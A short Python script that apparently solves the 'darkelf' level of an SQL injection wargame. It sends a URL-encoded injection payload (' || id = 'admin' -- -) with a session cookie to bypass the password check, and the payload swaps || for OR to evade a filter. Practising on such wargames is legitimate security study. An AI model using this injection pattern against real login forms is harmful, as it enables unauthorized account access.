import requests
from urllib import parse

host = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw="
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
param = "%27%20||%20id%20=%20%27admin%27%20--%20-"
res = requests.get(host + parse.quote(param), cookies=cookies)
print(res.text)
